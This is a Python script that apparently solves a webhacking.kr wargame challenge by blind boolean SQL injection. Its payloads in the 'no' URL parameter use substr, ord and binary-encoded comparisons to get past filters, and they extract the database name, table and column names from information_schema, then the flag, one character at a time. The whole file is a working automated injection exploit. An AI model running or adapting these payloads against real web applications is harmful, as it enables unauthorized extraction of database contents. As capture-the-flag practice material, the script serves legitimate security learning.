import requests

url = 'https://webhacking.kr/challenge/web-10/'
keys = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
val = ''

def str2bin(string):
        return '0b' + ''.join(format(ord(x),'b').zfill(8) for x in string)

def getflag(sel=None, dbn=None, tbn=None, coln=None):
    keys = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*}(){1234567890'
    val =''
    for i in range(1,60):
            for key in keys:
                    if sel == 1:
                        param = '?no=if(ord(substr(database(),' + str(i) + ',1))in({}),1,0)'.format(ord(key))
                    elif sel == 2:
                        param = '?no=if((select(substr(min(if((select(table_schema)in(database())),table_name,null)),'+ str(i) +',1))from(information_schema.tables))in('+ str(bin(ord(key))) +'),1,0)'
                    elif sel == 3: 
                        param = '?no=if((select(substr(min(if((select(table_name)in('+str2bin(tbn)+')),column_name,null)),'+str(i)+',1))from(information_schema.columns))in('+str(bin(ord(key)))+'),1,0)'
                    elif sel == 4:
                        param = '?no=if((select(substr(max('+coln+'),'+str(i)+',1))from('+dbn+'.'+tbn.lower()+'))in('+str(bin(ord(key)))+'),1,0)'
                    response = requests.get(url+param)
                    if('<td>1</td>' in response.text):
                            val += key
                            print(val)
                            break
                    if key == '0':
                        return val

dbn = 'chall13'
tbn = 'flag_ab733768'
coln = 'flag_3a55b31d'

# dbn = getflag(sel=1)
# tbn = getflag(sel=2)
# coln = getflag(sel=3, tbn=tbn)


result = getflag(sel=4, dbn=dbn ,tbn=tbn, coln=coln)

print("\n>> DB Name  : " + dbn)
print('TABLE NAME   : ' + tbn)
print("COLUMN NAME  : " + coln)
print('FLAG        :: ' + result)


